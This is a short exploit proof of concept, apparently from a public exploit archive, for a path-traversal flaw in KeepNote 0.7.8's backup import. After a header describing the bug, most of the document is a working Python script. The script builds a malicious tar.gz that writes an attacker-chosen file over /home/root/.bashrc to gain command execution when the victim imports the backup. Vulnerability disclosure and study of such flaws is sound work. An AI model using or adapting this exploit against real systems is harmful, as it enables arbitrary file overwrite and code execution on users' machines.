# Title : KeepNote 0.7.8 Remote Command Execution
# Date : 29/09/2016
# Author : R-73eN
# Twitter : https://twitter.com/r_73en 
# Tested on : KeepNote 0.7.8 (Kali Linux , and Windows 7)
# Software : http://keepnote.org/index.shtml#download
# Vendor : ~ 
#
# DESCRIPTION:
#
# When the KeepNote imports a backup which is actuallt a tar.gz file doesn't checks for " ../ " characters 
# which makes it possible to do a path traversal and write anywhere in the system(where the user has writing permissions).
# This simple POC will write to the /home/root/.bashrc the file test.txt to get command execution when the bash is run.
# There are a lot of ways but i choose this just for demostration purposes and its supposed we run the keepnote application
# as root (default in kali linux which this bug is tested).
#
#


banner = ""
banner +="  ___        __        ____                 _    _  \n" 
banner +=" |_ _|_ __  / _| ___  / ___| ___ _ __      / \  | |    \n"
banner +="  | || '_ \| |_ / _ \| |  _ / _ \ '_ \    / _ \ | |    \n"
banner +="  | || | | |  _| (_) | |_| |  __/ | | |  / ___ \| |___ \n"
banner +=" |___|_| |_|_|  \___/ \____|\___|_| |_| /_/   \_\_____|\n\n"
print banner

import tarfile, sys

if(len(sys.argv) != 2):
    print "[+] Usage : python exploit.py file_to_do_the_traversal [+]"
    print "[+] Example: python exploit.py test.txt" 
    exit(0)
print "[+] Creating Exploit File [+]"

filename = "KeepNoteBackup.tar.gz"

path = "../../../../../../../home/root/.bashrc"

tf = tarfile.open(filename,"w:gz")
tf.add(sys.argv[1], path)
tf.close()

print "[+] Created KeepNoteBackup.tar.gz successfully [+]"
